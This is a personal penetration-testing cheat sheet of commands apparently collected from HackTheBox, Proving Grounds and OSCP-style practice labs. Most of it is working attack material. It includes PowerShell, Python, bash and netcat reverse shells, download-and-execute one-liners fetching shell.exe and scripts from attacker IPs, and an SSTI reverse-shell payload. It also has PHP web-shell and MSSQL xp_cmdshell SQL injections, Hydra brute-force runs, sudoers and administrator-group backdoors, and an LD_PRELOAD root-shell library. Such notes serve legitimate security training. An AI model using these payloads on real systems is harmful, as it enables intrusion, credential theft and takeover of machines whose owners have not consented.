grep –i veronica /usr/share/wordslists/rockyou.txt > /root/Desktop/dict.txt #grep all the words from rockyou.txt with veronica in them and sore them to dict.txt

for x in 1066 1215 1466 67 1469 1514 1981 1986; do nmap -Pn –host-timeout 201 –max-retries 0 -p $x 192.168.0.102; done # script for port scanning with selected ports

curl -k http://10.10.10.7/themes/elastic/images/logo.png -o logo1.png #download a file and -k to ignore certificate checking and -o to save file
as logo1.png

exiftool logo.png #exiftool is a platform independent command line and GUI application for 
reading, writing and editing meta information of images and media files

searchsploit -x php/webapps/37879.pl #For showing the code of exploit

wc -l /usr/share/wordlists/dirbuster/dirty_Cheater #count lines in a file, wc=word count

:g/nologin/d #when in vim, use this to delete the lines with nologin written

hydra -L users -P pw ssh://10.10.10.7 #brute force on ssh protocol with usernames from users file and passwords from pw file

ls /etc | grep fail2ban #grep fail2ban filenames from etc folder

ls -l /usr/share/nmap/scripts/irc- #for searching for related service vulnerability in nse (htb irked)

graph.php?current_lang=../../../../var/lib/asterisk(username)/.ssh/id_rsa #See if you can get users private key if you find an LFI

telnet 10.10.10.7 25 #telnet to see if the smtp port is responding

nc lvnp 1337 #listen on port 1337 using ncat

sudo -l #To find out what commands you can run as 

dig axfr @10.10.10.13 cronos.htb #dns zone transfer

nano /etc/hosts #if you find a dns running edit your host file for resolving through it, example > 10.10.10.13     example.htb

/opt/gobuster/gobuster -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u https://10.10.10.60 -k -x txt #-k to ignore
ssl certification verification and -x to add extension to every file in the wordlist

nmap -sS -A --top-ports 1000 10.10.10.29 | tee nmap_bank.txt

nikto -host IP

nmap -sC -sV -oA nmap 10.10.10.7 

python -c 'import pty;pty.spawn("/bin/bash");'

python3 dirsearch.py -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e php -f -t 20 -u http://10.10.10.7/admin/

iptables -L #List all the rules

iptables -A OUTPUT -d 10.10.10.14 -j DROP #Drop packets going to 10.10.10.14

./gobuster -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.10.15 -t 20

davtest -url http://10.10.10.15 #For testing webDAV servers

msfvenom -l | grep windows #search for windows keyword  in payloads

msfvenom -p winodws/meterpreter/reverse_tcp LHOST=10.10.14.4 LPORT=4444 -f aspx

echo /asdasd23213sdasdasdwqeqweA= |base64 -d > file #copy the magic bytes, base64 encode it and safe it in a file 
file file #run this command to find if the file is identified as your prefered one or not.

dnsenum --enum example.htb


Remote access to mssql server:
sqsh -S 192.168.113.70:1435 -U sa

sqlmap -r request.req #sqlmap for POST request 

python -m SimpleHTTPServer #running python server on port 8000

wget -r http://10.10.14.28:8000/ #run this on victim's machine for transfering file from your own to victim's machine.

Run this with username and password to download everything hosted over a ftp server:

wget --user test --password 'test' -r ftp://10.10.10.197

nmap --script vuln -p135,139,445 10.10.10.40 -oA blue_scripts #If the target is vulnerable to Eternal Blue exploit 

smbclient -L //10.10.10.40 #smb recon
smbclient \\\\10.10.10.178\\IPC$ #Accessing share
smbclient \\\\10.10.10.178\\Users -U TempUser #Accessing share with username
smbmap -R -H 10.10.10.123 #smbmap to enumerate share permissions

Adding a php rce file using union based sqli: 
' UNION SELECT ("<?php echo passthru($_GET['cmd']);") INTO OUTFILE 'C:/xampp/htdocs/command.php'  -- -'


exploit -j #for runnung a listner in background in msfconsole

find / -perm -4000 2>/dev/null #look for setuid binaries 
find / -perm -4000 -ls 2>/dev/null #look for setuid binaries with permissions as well

Download all files on an rsync server from fox folder:
rsync -av fox@192.168.69.126::fox/ . (provingground fail machine)

nmap --script vuln /usr/share/nmap/scripts/smb-check-vulns.nse 10.10.10.178 -p445 #nmap engine 
nmap -p 445 --script "vuln and safe" -Pn -n 10.11.1.5  #For runnning nmap engine

locate ms17-010 | grep .nse$ #Look for nmap scripts with ms17-010

uname -m # Find linux architecture

gcc -m32 1397.c -o 1398 -Wl,--hash-style=both #compile c file with 32 bit architecture with both the hash styles

Downloading files on Windows using powershell:

powershell.exe "IEX(New-Object Net.WebClient).downloadString('http://<>/Invoke-PowershellTCP.ps1')"

Invoke-WebRequest -Uri http://<>/file -OutFile <filename>

powershell.exe iwr -Uri http://<ip>/filename -Outfile filename #I have seen it work ;)

powershell -c "(new-object System.Net.WebClient).DownloadFile('http://192.168.119.190:8000/ps.ps1','C:\Users\admin\Desktop\shell.ps1')"

Execute the downloaded file through powershell:

powershell -ExecutionPolicy Unrestricted -File C:\Users\admin\Desktop\shell.ps1

Transfer file using certutil: 

certutil.exe -urlcache -split -f "http://10.12.14.13:8000/shell.exe" s.exe

Without quotes: certutil -urlcache -split -f http://192.168.49.170:3036/shell.exe

Netcat payload for executing reverse shell on linux:

nc -n 192.168.44.56 4242 -e /bin/bash

Using olevba to see if the payload is present in the file or not:

olevba -c evil80.doc

Powershell reverse shell one liner:

powershell -NoP -NonI -W Hidden -Exec Bypass "& {$ps=$false;$hostip='192.168.xxx.xxx';$port=xxxx;$client = New-Object System.Net.Sockets.TCPClient($hostip,$port);$stream = $client.GetStream();[byte[]]$bytes = 0..50000|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$cmd=(get-childitem Env:ComSpec).value;$inArray=$data.split();$item=$inArray[0];if(($item -eq '$ps') -and ($ps -eq $false)){$ps=$true}if($item -like '?:'){$item='d:'}$myArray=@('cd','exit','d:','pwd','ls','ps','rm','cp','mv','cat');$do=$false;foreach ($i in $myArray){if($item -eq $i){$do=$true}}if($do -or $ps){$sendback=( iex $data 2>&1 |Out-String)}else{$data2='/c '+$data;$sendback = ( &$cmd $data2 2>&1 | Out-String)};if($ps){$prompt='PS ' + (pwd).Path}else{$prompt=(pwd).Path}$sendback2 = $data + $sendback + $prompt + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()}"

Find writeable directory in linux:

find / -type d -writable 2>/dev/null

Using wget to download file and setting permission:
wget "https://github.com/diego-treitos/linux-smart-enumeration/raw/master/lse.sh" -O lse.sh;chmod 700 lse.sh

If ports show up as filtered on nmap try:
nmap -sS -v -v -Pn <IP>

Bypass execution policy Powershell:
powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('http://192.168.119.149:8081/login.ps1')"

Cross compilation an example:
i686-w64-mingw32-gcc ms11-046.c -o ms11-046.exe -lws2_32

xfree rdp usage:
xfreerdp /u:admin /p:lab /v:192.468.456.10:3389

Add user Bruce(75):
service_exec(conn, r'regsvr32 /s /n /u /i:http://192.168.119.190/file.txt file.txt')
service_exec(conn, r'cmd /c net user /add ban ban123')
net localgroup "Remote Desktop Users" ban /add #give permission for remote desktop
net localgroup administrators ban /add #add user to administrator group for priv esc

UDP scan top 1000 ports:
nmap -sU -sV --version-intensity 0 -F -n 10.11.458.254
nmap -vvv -sU -sV 10.10.10.116 (htb conceal rk)
nmap -vvv -sU -T4 10.10.10.186

Running nse script on a udp port:
nmap -n -Pn -sU -p69 -sV --script tftp-enum 10.11.458.244
Enumerating port 161 :
nmap -p 161 -sU -sC -sV 10.10.10.116 (htb conceal rk)


gobuster usage:
gobuster dir -u http://10.11.1:95 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 100 -o gobuster9505

gobuster usage with -x to add php extension or any other extension:
gobuster dir -u http://10.11.1:95 -x php -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 100 -o gobuster9505

If in gobuster wildcard error comes specify the wildcard flag like this:
gobuster dir -u http://10.11.1:95 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 100 --wildcard 200,301,302 -o gobuster9505

Check if netcat present:
'<?php echo shell_exec("nc -v");exit;?>'

get shellcode and execute :
'<?php system("whoami; wget 192.168.44.44/shellcode; chmod 755 shellcode;./shellcode")?>'

For mimikatz 2.1.1 :
wget https://github.com/gentilkiwi/mimikatz/files/4167347/mimikatz_trunk.zip

Accessing share with name in space:
smbclient \\\\10.11.1.55\\Bob\ Shard

Mount share:
mount -t cifs //10.11.1.55//Bob\ Shard ./smb

mount -t cifs -o vers=1.0 //10.11.1.55/"Bob Shard"  smb #this is how it actually worked :)

SO file with msfvenom:
msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.44.44 LPORT=443 -f elf-so > exec.so

find command:
find / -name network.txt
find . -name '*.exe' #search for all exe files in the current folder

Union based Oracle Sqli:
' or 1=1 union SELECT table_name,null,null FROM all_tables --
' or 1=1 union SELECT column_name,null,null FROM all_tab_columns WHERE table_name = 'tablename' --
' or 1=1 union SELECT null,password,null FROM WEB_ADMINS #display value of column password

UDP Scanning Netcat:
nc -zuv 10.11.1.226 1-100->port range

Searching in metapsloit with keywords:
search platform:windows bid:5411

NETCAT for cronjobs (mthod 1):
#!/bin/bash
nc -c /bin/bash\ -i 192.168.1129.1119 5555 0>&1

(mthod 2):
msfvenom -p cmd/unix/reverse_netcat lhost=10.0.2.4 lport=8888 R #generates payload below which can be echoed to a script

echo "mkfifo /tmpmzlat; nc <ip> <port> 0</tmp/zlat | /bin/sh >/tmp/zlat 2>&1; rm /tmp/zlat" >> script

bruteforcing wplogin hydra
hydra -l admin -P /home/kali/Desktop/10.11.1/rockyou.txt 10.11.1 -V http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log 
In&testcookie=1:S=Location'


Post request brute force without admin field:
hydra -l "" -P /usr/share/dirb/wordlists/big.txt 192.168.1.107 http-post-form "/kzMb5nVYJw/index.php:key=^PASS^:invalid key" #Machine nullbyte from vulnhub

Run aggresive scan on a single port:
nmap -p6379 -sV -A 192.168.77.69

Msfvenom JS payload:
msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.11944 LPORT=443 CMD=/bin/bash -f js_le -e generic/none

See hidden files and folders in Windows:
dir /ah

Search for a file recursively:
dir Storage.exe /s

Search for folder in windows, type this in root directory:

dir <Folder Name> /AD /s

Stronger powershell one liner:

powershell -NoP -NonI -W Hidden -Exec Bypass "& {$ps=$false;$hostip='192.168.xxx.xxx';$port=xxxx;$client = New-Object System.Net.Sockets.
TCPClient($hostip,$port);$stream = $client.GetStream();[byte[]]$bytes = 0..50000|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) 
-ne 0){$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$cmd=(get-childitem Env:ComSpec).value;$inArray=$data.split();
$item=$inArray[0];if(($item -eq '$ps') -and ($ps -eq $false)){$ps=$true}if($item -like '?:'){$item='d:'}$myArray=@('cd','exit','d:','pwd','ls','ps','rm',
'cp','mv','cat');$do=$false;foreach ($i in $myArray){if($item -eq $i){$do=$true}}if($do -or $ps){$sendback=( iex $data 2>&1 |Out-String)}else{$data2='/c '+
$data;$sendback = ( &$cmd $data2 2>&1 | Out-String)};if($ps){$prompt='PS ' + (pwd).Path}else{$prompt=(pwd).Path}$sendback2 = $data + $sendback + $prompt + 
'> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()}"

curl -i iphere #get webserver headers using curl
curl -i -L 10.11 #follow the redirect, if 302 on a request use this
curl 10.11 -s -L | grep "title\|href" | sed -e 's/^[[:space:]]*//' #quickly check the title tag (as that can have the web application name in it) as well as any links 
curl 10.11 -s -L | html2text | uniq #use html2text instead of opening your web browser ;)
curl 10.11/robots.txt -s | html2text #read robots.txt using html2text

Wordlists to explore:
DirB - /usr/share/dirb/wordlists/
wfuzz - /usr/share/wfuzz/wordlist/
SecList - /usr/share/seclists/

searchsploit Apache 2.4.7 | grep -v '/dos/' #remove any DoS exploits in our searches
relax the search terms again, by trying:
searchsploit apache 2.4 | grep -v '/dos/'
searchsploit apache 2.x | grep -v '/dos/'
searchsploit -t php 5.x #display title of exploits only
searchsploit -t php 5.x | wc -l #word count for the exploit search
searchsploit -t php 5.x | grep -v '/dos/' #
searchsploit -t php 5.x | grep -v '/dos/' | grep -vi '\.php' | head 
searchsploit --colour -t php 5.x | grep -v '/dos/' | grep -iv '\.php[^$]' #use "regex" (Regular Expressions) to filter all ".php" results except for when the end of the line, ends with ".php"

If nmap scan is taking time, run this:
nmap 10.11 -p- -sT --reason --open --dns-server [REDACTED]

Information gathering from rpc:
rpcinfo -s 10.11

If you dont have write permissions in Windows shell or is running in low intergrity mode:
C:\Users\[username]\AppData\Local\Temp\Low>
You can still write to the above folder :)


The “cmd /c” is used to create a new shell, execute the provided command, and exit from the shell automatically. The cmd.exe also provides the /k option which will not exit from the created shell automatically. It will stay the newly created and command executed shell

cmd /c dir 

Use below syntax when running gobuster with proxychains and pivot:
HTTP_PROXY="socks5://127.0.0.1:1234/" gobuster dir -u http://10.11.272 -w /usr/share/seclists/Discovery/Web-Content/common.txt -t 100 -o gobuster2

rdesktop fullscreen:
rdesktop -g 1100x900 -u admin -p lab -z -P -x 1 -r disk:share=/var/www/html 192.168.

wmic service get Caption,StartName #get services running and the user they are running as

If some service is running locally @ 127.0.0.1:8888 windows:
Port Forwarding using plink:
plink.exe -l kali -pw toor -R 8888:127.0.0.1:8888 <attackermachine>
use netstat -ano | grep 8888  to confirm the port forward on your machine.

Port Forwarding using chisel:
First start server on attacker machine:
./chisellinux server -p 8000 --reverse

On victim machine tranfer chisel.exe and run:
chisel.exe client <attackermachine>:8000 R:8888:127.0.0.1:8888
netstat -ano | grep 8000 to confirm the port forward on your machine.

See mounted drives using nmap script:
nmap -sV --script=nfs-showmount -oN output.nfs <ip>

Show if any drive to mount:
showmount 10.10.10.180 -e

Mount nfs drive:
mount -t nfs remote.htb:/site_backups mount #first create mount folder

Run powerup.ps1 script like this:
PS C:\Users\Public> Import-Module ./powerup.ps1
PS C:\Users\Public> Invoke-AllChecks | Out-File -Encoding ASCII checks.txt
PS C:\Users\Public> type checks.txt 

To see files from alternate data streams:
dir /R

To read file from alternate data stream:
hm.txt:root.txt:$DATA #alternate data stream

more <hm.txt:root.txt:$DATA #type this command to read file root.txt

Check stored passwords in bash history:
cat ~/.bash_history | grep -i passw

netstat -tupln #Internal ports on linux box

mysqldump Magic -u theseus -p #if mysql username and passwd found dump the database on victim machine 

See hidden files on Windows (Bounty from Htb) use this command:
attrib

Windows 2008 server juicy potato command:
jp.exe -t * -p shell.bat -l 4444 -c {9B1F122C-2982-4e91-AA8B-E071D54F2A4D} #Refer to rana khalil bounty htb

ssh login with private key:
ssh hype@10.10.10.79 -i private_key

Echo bash reverse shell into a file:
echo 'bash -i >& /dev/tcp/192.168.118.5/4444 0>&1' >> /etc/postfix/disclaimer #postfix proving ground

If doing ssh gives this error(htb sunday):
Unable to negotiate with 10.10.10.76 port 22022: no matching key exchange method found. 
Their offer: gss-group1-sha1-toWM5Slw5Ew8Mqkay+al2g==,diffie-hellman-group-exchange-sha1,diffie-hellman-group1-sha1

Use this to select the suitable algo:
ssh -oKexAlgorithms=diffie-hellman-group1-sha1 -p 22022 user@10.10.10.76

Make the shell responsive with tab auto completion (htb irked):

Firstly background the shell with ctrl z and then type:
stty raw -echo
then run fg to bring the shell back :)

Bring the clear screen option into reverse shell:
export TERM=xterm


create a file named listusers for bash execution (htb irked):
echo "bash" > /tmp/listusers

enuemrating snmp(htb conceal rk):
snmpwalk -c public -v 1 10.10.10.116 > snmp-public.txt

Use wfuzz for parameter bruteforcing and hide code 404:
wfuzz -u http://logger.htb/room.php?cod=1FUZZ -w /usr/share/seclists/Fuzzing/special-chars.txt --hc 404

Use wfuzz for bruteforcing with username or email list(htb quick ippsec):
wfuzz -u http://10.10.10.186:9001/login.php -d "email=FUZZ&passsword=PleaseWork" -w emaillist

www-data@jarvis:/home/pepper$ sudo -l
Matching Defaults entries for www-data on jarvis:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/binUser www-data may run the following commands on jarvis:
    (pepper : ALL) NOPASSWD: /var/www/Admin-Utilities/simpler.py
As can be seen above, we have the right to run the file simpler.py with pepper’s privileges. Let’s view the permissions on the file.

To do a recursive search on files of the whole directory (htb node rk):
grep -rl "password"

Wordpress scanning:
wpscan --url https://brainfuck.htb --disable-tls-checks --api-token
wpscan --url https://brainfuck.htb --enumerate p --disable-tls-check

Do this to get the vulnerable plugin:
wpscan --url http://192.168.50.9/wordpress -e ap --plugins-detection aggressive --api-token hX83TxNSYeYTUz1sFiiVKsOCBxHELHACakJc7uvt7fA

wpscan --url http://192.168.50.9/wordpress --usernames c0rrupt3d_brain --passwords /usr/share/wordlists/rockyou.txt #password burte forcing

File to look for if u have wordpress running for database credentials:
/var/www/html/weblog/wp-config.php

#From htb optimum walkthrough comment section:
Thanks for bringing Sherlock back!  :D

I tend to do something like:  `iex ((new-object net.webclient).downloadstring("http://x.x.x.x/Sherlock.ps1")); Find-AllVulns`.  Saves having to mod the script.

ps -ef | grep root # for all the root running processes on linux 

Dowload powershell script and execute it through powershell from cmd prompt (ippsec bastard):
echo IEX(New Object Net.WebClient).DownloadString('http://10.10.15.1:8000/Sherlock.ps1') | powershell -noprofile -

Path to id_rsa:
file:///home/roosa/.ssh/id_rsa'> (htb devoops rk)

Port Knocking:
find the sequence in /etc/knockd.conf file
apt-get instsall knockd
knock hostip hostports
knock 10.0.0.0 4444 5555 6666 

If u dont have curl or wget or netcat on machine use python to download file:
import urllib
urllib.urlretrieve ("http://www.example.com/songs/mp3.mp3", "mp3.mp3")

python -c 'import urllib;urllib.urlretrieve ("http://www.example.com/songs/mp3.mp3", "mp3.mp3")'

Check for shell shock vulnerability:
curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd'" http://<ip>/cgi-bin/underworld(vulnerable script)

Python reverse shell pentest monkey one with new line(tested on vulnhub machine symfonos3):

import socket,subprocess,os

s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("192.168.50.4",443))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p = subprocess.call(["/bin/sh","-i"])

Local port forwarding using socat on linux:
socat TCP-LISTEN:8081,fork TCP:127.0.0.1:8080 #forwards local port 8080 to remote host 8081 (run this on victim's machine)

Server side template injection payload (htb doctor):
{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.14.24\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/bash\"]);'").read().zfill(417)}}{%endif%}{% endfor %}

Copy output to clipboard:
echo "hello" | xclip -se c
 
Ippsec (Luaane htb)
ffuf -u http://10.10.10.218/weather/FUZZ -w /opt/SecLists/Discovery/Web-Content/raft-small-words.txt

ffuf -u http://10.10.10.218/weather/FUZZ -w /opt/SecLists/Fuzzing/special-chars.txt -mc 200,500 # match code http response 200 and 500

ffuf -u http://10.10.10.218/weather/FUZZ -w /opt/SecLists/Fuzzing/special-chars.txt -mc 200,500 -fw 5 # match code http response 200 and 500 and filter word whos length is 5. 

ffuf -u http://10.10.10.218/weather/forecast?city=\'FUZZ-- -w /opt/SecLists/Fuzzing/special-chars.txt -mc 200,500 -fw 9 #figuring out command injection in lua

ps -ef | grep username #See what users are executing

Get HTTP and HTTPS traffic on selected interface:
tcpdump -i ens19 -nl port http or port https

bash reverse shell that works for ippsec so it works for me :)
bash -c 'bash -i >& /dev/tcp/10.10.14.2/443 0>&1'

Download all files in Commander share:
smbget -R smb://<ip>:12445/Commander

Ab shell nhe lain gei, yei karein gei (MKC):
echo "dademola     ALL=(ALL) NOPASSWD:ALL >> /etc/sudoers" #here dademola is the username

Msfvenom for Buffer overflow (Alphanumeric payload): (Kevin from Offsecproving ground)
msfvenom -p windows/shell_reverse_tcp -f exe --platform windows -a x86 -e x86/alpha_mixed -f c -b "\x00\x3a\x26\x3f\x25\x23\x20\x0a\x0d\x2f\x2b\x0b\x5c\x3d\x3b\x2d\x2c\x2e\x24\x25\x1a" LHOST=192.168.218.3 LPORT=443

Enumerate users from smtp:
smtp-user-enum -M VRFY -u claire -t 192.168.55.55

Connect to pop port to login to mail boxes:
nc -v ipordomain 110

Butch Blind sqli payloads:

EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;


butch';EXEC xp_cmdshell 'ping 192.168.49.179' ; --

butch';EXEC sp_configure 'show advanced options', 1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell', 1;RECONFIGURE;EXEC xp_cmdshell 'ping -n 4 192.168.49.125';WAITFOR DELAY '0:0:5';--

butch' UNION SELECT butch,butch --

butch';IF (user_name()='butch') WAITFOR DELAY '0:0:5' ELSE WAITFOR DELAY '0:0:1';--

butch';IF (substring(user_name(), 2, 1)='a') WAITFOR DELAY '0:0:5' ELSE WAITFOR DELAY '0:0:1';--

butch';GRANT EXECUTE ON xp_cmdshell TO 'butch';--

butch';IF (is_srvrolemember('sysadmin')=1) WAITFOR DELAY '0:0:5' ELSE WAITFOR DELAY '0:0:1';--

SELECT is_srvrolemember(‘sysadmin’);

butch';IF (SUBSTRING((SELECT TOP 1 name FROM syscolumns WHERE id = (SELECT id FROM sysobjects WHERE name = 'users') AND name !='username'),1,1)='a') WAITFOR DELAY '0:0:5' ELSE WAITFOR DELAY '0:0:1';--

butch';IF (SUBSTRING((SELECT TOP 1 password_hash FROM users),1,1)='a') WAITFOR DELAY '0:0:5' ELSE WAITFOR DELAY '0:0:1';--

admin' UNION SELECT username,password_hash FROM users; --
----------------------------------------------------------------------------------
###From Priv Esc course by Tib3rius:
Dont take a reverse shell do this instead:
#!/bin/bash
cp /bin/bash /tmp/rootbash
chmod +s /tmp/rootbash
Once the /tmp/rootbash file is created, execute it (with 
-p to preserve the effective UID) to gain a root shell:

Find SUID & SGID Binaries:
find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null

Create an elf file to run a custom command using msfvenom:
msfvenom -p linux/x86/exec CMD="/bin/bash -p" -f elf -o shell.elf

Run linux exploit suggester 2 like this: 
https://github.com/jondonas/linux-exploit-suggester-2
./linux-exploit-suggester-2.pl –k 2.6.32  <- (This is kernal version)

Show all processes running as root:
ps aux | grep "^root"

On Debian-like distributions, dpkg can show installed programs and their version:
dpkg -l | grep <program>

port Forwarding using ssh:
ssh -R <local-port>:127.0.0.1:<target-port> <username>@<local-machine>

Find all writable files in /etc:
find /etc -maxdepth 1 -writable -type f

Find all readable files in /etc:
find /etc -maxdepth 1 -readable -type f

Find all directories which can be written to: 
find / -executable -writable -type d 2> /dev/null

preload.c file:
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
    void _init() {
    unsetenv("LD_PRELOAD");
    setresuid(0,0,0);
    system("/bin/bash -p");
}

This can be compiled to generate a so file:
gcc -fPIC -shared -nostartfiles -o /tmp/preload.so preload.c

print the shared libraries used by a program:
ldd /usr/sbin/apache2

Upload file on windows using smb shares:
python3 /usr/share/doc/python3-impacket/examples/smbserver.py kali . #host the pwd named as kali as a smb share

On Windows:
copy \\<ip of your kali machine>\kali\yourfile.exe C:\PrivEsc\yourfile.exe

Add your user to administrator group and login thorugh rdp:
net localgroup administrators user /add ;)

Accept the eula from command line for accesschk.exe:
accesschk.exe /accepteula 

Create binary to execute /bin/bash using msfvenom:
msfvenom -p linux/x86/exec CMD="/bin/bash -p" -f elf -o /tmp/nfs/shell.elf
